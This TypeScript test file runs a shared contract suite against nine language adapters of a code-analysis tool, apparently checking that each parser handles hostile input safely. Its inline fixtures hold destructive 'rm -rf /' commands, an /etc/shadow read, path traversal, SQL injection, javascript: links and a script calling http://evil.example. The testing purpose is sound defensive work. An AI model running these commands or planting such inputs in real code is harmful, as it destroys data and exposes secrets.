import { readFileSync } from 'node:fs';
import { join } from 'node:path';

import {
  fixtureRepoPath,
  LANGUAGE_ADAPTER_CONTRACT_CHECKS,
  runLanguageAdapterContractChecks,
} from '@impactgraph/test-kit';
import { describe, expect, it } from 'vitest';

import {
  createAstroAdapter,
  createFallbackAdapter,
  createHtmlAdapter,
  createJavaAdapter,
  createPrismaAdapter,
  createPythonAdapter,
  createSpringConfigAdapter,
  createTerraformAdapter,
  createTypeScriptAdapter,
} from './index.js';

import type {
  ContractCheckResult,
  ContractFile,
  ContractLanguageAdapter,
  LanguageAdapterContractOptions,
} from '@impactgraph/test-kit';

// PRD §42.1 — the reusable adapter contract suite, applied. Declaring the invariants is not
// enough; each adapter proves them here, in the `analyzers` project.

const context = {
  repositorySnapshotId: 'snap-contract',
  analysisRunId: 'run-contract',
  createdAt: '2026-08-02T09:00:00.000Z',
};

const fromFixture = (fixture: string, relativePath: string): ContractFile => ({
  relativePath,
  content: readFileSync(join(fixtureRepoPath(fixture), relativePath), 'utf8'),
});

const HOSTILE_FILES: readonly ContractFile[] = [
  fromFixture('malicious', 'src/injection.ts'),
  fromFixture('malicious', 'src/traversal.ts'),
  fromFixture('malicious', 'src/-looks-like-a-flag.ts'),
  fromFixture('malicious', 'src/name with spaces.ts'),
];

/**
 * Assert one adapter against the shared suite. Every documented check must be reported, and no
 * check may report a failure; skipped checks are listed explicitly so a skip is never silent.
 */
const contractSuiteFor = (
  adapterName: string,
  adapter: ContractLanguageAdapter,
  options: LanguageAdapterContractOptions,
  expectedSkips: readonly string[],
): void => {
  describe(`${adapterName} — LanguageAdapter contract suite (§42.1)`, () => {
    const run = runLanguageAdapterContractChecks(adapter, options);

    it.each([...LANGUAGE_ADAPTER_CONTRACT_CHECKS])('%s', async (name) => {
      const results = await run;
      const found: ContractCheckResult | undefined = results.find(
        (candidate) => candidate.name === name,
      );
      expect(found, `check '${name}' was never run`).toBeDefined();
      expect(found?.failures ?? ['check missing']).toEqual([]);
    });

    it('skips only the documented checks', async () => {
      const results = await run;
      const skips = results
        .filter((entry) => entry.status === 'skipped')
        .map((entry) => entry.name);
      expect(skips.sort()).toEqual([...expectedSkips].sort());
    });
  });
};

contractSuiteFor(
  'TypeScript/JavaScript adapter',
  createTypeScriptAdapter(),
  {
    fixtureName: 'ts-basic',
    context,
    matchingFiles: [
      fromFixture('ts-basic', 'src/services/deal-service.ts'),
      fromFixture('ts-basic', 'src/lib/deal-repository.ts'),
      fromFixture('ts-basic', 'src/api/deals.ts'),
    ],
    nonMatchingPaths: ['infra/main.tf', 'prisma/schema.prisma', 'README.md'],
    hostileFiles: HOSTILE_FILES,
    foreignFiles: [
      { relativePath: 'infra/main.tf', content: 'resource "google_pubsub_topic" "deals" {}' },
      { relativePath: 'config/settings.yaml', content: 'feature: true\nname: deals\n' },
    ],
  },
  ['unparseable-content-is-recorded-as-a-warning'],
);

contractSuiteFor(
  'Prisma adapter',
  createPrismaAdapter(),
  {
    fixtureName: 'ts-basic',
    context,
    matchingFiles: [
      {
        relativePath: 'prisma/schema.prisma',
        content: 'model Deal {\n  id String @id\n}\n\nmodel Buyer {\n  id String @id\n}\n',
      },
    ],
    nonMatchingPaths: ['src/index.ts', 'infra/main.tf'],
    hostileFiles: HOSTILE_FILES,
    foreignFiles: [{ relativePath: 'src/index.ts', content: 'export class Deal {}' }],
  },
  ['unparseable-content-is-recorded-as-a-warning'],
);

// Python is the first tree-sitter adapter (ADR-0008) and the first one whose parser has real
// error recovery, so — unlike TS and Prisma — it reports unparseable content and skips nothing.
contractSuiteFor(
  'Python adapter',
  createPythonAdapter(),
  {
    fixtureName: 'fastapi-app',
    context,
    matchingFiles: [
      fromFixture('fastapi-app', 'app/main.py'),
      fromFixture('fastapi-app', 'app/models.py'),
      fromFixture('fastapi-app', 'app/routers/deals.py'),
    ],
    nonMatchingPaths: ['src/index.ts', 'prisma/schema.prisma', 'infra/main.tf'],
    hostileFiles: [
      ...HOSTILE_FILES,
      {
        relativePath: 'app/hostile.py',
        content: '__import__("os").system("rm -rf /")\n@__import__("x")\ndef h():\n    pass\n',
      },
    ],
    unparseableFile: { relativePath: 'app/broken.py', content: 'def (:\n  class 3:\n   @@@\n' },
    foreignFiles: [
      { relativePath: 'infra/main.tf', content: 'resource "google_pubsub_topic" "deals" {}' },
      { relativePath: 'config/settings.yaml', content: 'feature: true\nname: deals\n' },
    ],
  },
  [],
);

// Java is the second tree-sitter adapter (ADR-0008). Like Python it has real error recovery, so
// it reports unparseable content and skips nothing.
contractSuiteFor(
  'Java adapter',
  createJavaAdapter(),
  {
    fixtureName: 'java-spring',
    context,
    matchingFiles: [
      fromFixture('java-spring', 'src/main/java/com/example/deals/DealController.java'),
      fromFixture('java-spring', 'src/main/java/com/example/deals/DealService.java'),
      fromFixture('java-spring', 'src/main/java/com/example/deals/DealsApplication.java'),
    ],
    nonMatchingPaths: ['src/index.ts', 'app/main.py', 'infra/main.tf'],
    hostileFiles: [
      ...HOSTILE_FILES,
      {
        relativePath: 'src/main/java/Hostile.java',
        content:
          '@SuppressWarnings("\'; DROP TABLE deals; --")\npublic class Hostile { void f() { Runtime.getRuntime().exec("rm -rf /"); } }\n',
      },
    ],
    unparseableFile: {
      relativePath: 'src/main/java/Broken.java',
      content: 'public class { { { @@@ void (\n',
    },
    foreignFiles: [
      { relativePath: 'infra/main.tf', content: 'resource "google_pubsub_topic" "deals" {}' },
      { relativePath: 'config/settings.yaml', content: 'feature: true\nname: deals\n' },
    ],
  },
  [],
);

// Astro parses in two halves (ADR-0014). Its "unparseable" case is not a syntax error but a
// malformed `---` split, which the adapter refuses to guess past — and reports.
contractSuiteFor(
  'Astro adapter',
  createAstroAdapter(),
  {
    fixtureName: 'astro-site',
    context,
    matchingFiles: [
      fromFixture('astro-site', 'src/pages/index.astro'),
      fromFixture('astro-site', 'src/layouts/Base.astro'),
    ],
    nonMatchingPaths: ['src/index.ts', 'app/main.py', 'prisma/schema.prisma'],
    hostileFiles: [
      ...HOSTILE_FILES,
      {
        relativePath: 'src/pages/hostile.astro',
        content:
          '---\nimport { x } from "../../../../etc/passwd";\nconst c = require("child_process");\n---\n<a href="javascript:alert(1)">go</a>\n<script>fetch("http://evil.example")</script>\n',
      },
    ],
    unparseableFile: {
      relativePath: 'src/pages/unterminated.astro',
      content: '---\nconst title = "never closed";\n<h1>{title}</h1>\n',
    },
    foreignFiles: [
      { relativePath: 'infra/main.tf', content: 'resource "google_pubsub_topic" "deals" {}' },
      { relativePath: 'config/settings.yaml', content: 'feature: true\nname: deals\n' },
    ],
  },
  [],
);

// Standalone HTML reuses the `html` grammar the Astro adapter already loads. Its "unparseable"
// case is broken markup, which tree-sitter recovers from and the adapter reports.
contractSuiteFor(
  'HTML adapter',
  createHtmlAdapter(),
  {
    fixtureName: 'html-site',
    context,
    matchingFiles: [fromFixture('html-site', 'index.html'), fromFixture('html-site', 'about.html')],
    nonMatchingPaths: ['src/index.ts', 'app/main.py', 'infra/main.tf'],
    hostileFiles: [
      ...HOSTILE_FILES,
      {
        relativePath: 'public/hostile.html',
        content:
          '<script>fetch("http://evil.example")</script>\n<link href="../../../../etc/passwd" />\n<a href="javascript:alert(1)">go</a>\n',
      },
    ],
    unparseableFile: {
      relativePath: 'public/broken.html',
      content: '<div><span></div></span><<<>\n<form action=\n',
    },
    foreignFiles: [
      { relativePath: 'infra/main.tf', content: 'resource "google_pubsub_topic" "deals" {}' },
      { relativePath: 'config/settings.yaml', content: 'feature: true\nname: deals\n' },
    ],
  },
  [],
);

// Terraform is the third tree-sitter adapter (ADR-0014, the `terraform` dialect grammar). Like
// Python and Java it has real error recovery, so it reports unparseable content and skips nothing.
contractSuiteFor(
  'Terraform adapter',
  createTerraformAdapter(),
  {
    fixtureName: 'terraform-gcp',
    context,
    matchingFiles: [
      fromFixture('terraform-gcp', 'main.tf'),
      fromFixture('terraform-gcp', 'variables.tf'),
      fromFixture('terraform-gcp', 'modules/dead-letter/main.tf'),
    ],
    nonMatchingPaths: ['src/index.ts', 'app/main.py', 'prisma/schema.prisma'],
    hostileFiles: [
      ...HOSTILE_FILES,
      {
        relativePath: 'infra/hostile.tf',
        content:
          'resource "null_resource" "x" {\n  provisioner "local-exec" { command = "rm -rf /" }\n  secrets = file("/etc/shadow")\n}\n\nmodule "escape" {\n  source = "../../../../etc"\n}\n',
      },
    ],
    unparseableFile: {
      relativePath: 'infra/broken.tf',
      content: 'resource "a" {{{ \n  = = =\nvariable\n',
    },
    foreignFiles: [
      { relativePath: 'src/index.ts', content: 'export class Deal {}' },
      { relativePath: 'config/settings.yaml', content: 'feature: true\nname: deals\n' },
    ],
  },
  [],
);

// The Spring property-source reader (epic-16). It has no parser and therefore no unparseable
// case: a line it cannot decode is skipped and counted, which is a warning about content, not a
// parse failure — so the documented skip is the same one the TypeScript and Prisma adapters take.
contractSuiteFor(
  'Spring configuration adapter',
  createSpringConfigAdapter(),
  {
    fixtureName: 'java-spring',
    context,
    matchingFiles: [fromFixture('java-spring', 'src/main/resources/application.yml')],
    nonMatchingPaths: ['src/index.ts', 'app/main.py', 'infra/main.tf'],
    hostileFiles: [
      ...HOSTILE_FILES,
      {
        relativePath: 'src/main/resources/application.yml',
        content:
          'constructor: x\n__proto__: y\ndeals:\n  topic: ${${${bomb}}}\n  path: ../../../../etc/passwd\n',
      },
    ],
    foreignFiles: [
      { relativePath: 'infra/main.tf', content: 'resource "google_pubsub_topic" "deals" {}' },
      { relativePath: 'src/index.ts', content: 'export class Deal {}' },
    ],
  },
  ['unparseable-content-is-recorded-as-a-warning'],
);

contractSuiteFor(
  'Fallback adapter',
  createFallbackAdapter(),
  {
    fixtureName: 'malicious',
    context,
    matchingFiles: [{ relativePath: 'infra/main.tf', content: 'resource "x" "y" {}' }],
    nonMatchingPaths: ['src/index.ts'],
    hostileFiles: HOSTILE_FILES,
    foreignFiles: [],
    // The fallback is the catch-all of PRD §34: detecting every repository is its job.
    expectDetectionForNonMatching: true,
  },
  [
    'unparseable-content-is-recorded-as-a-warning',
    'nothing-beyond-file-level-facts-is-emitted-outside-supportedExtensions',
  ],
);
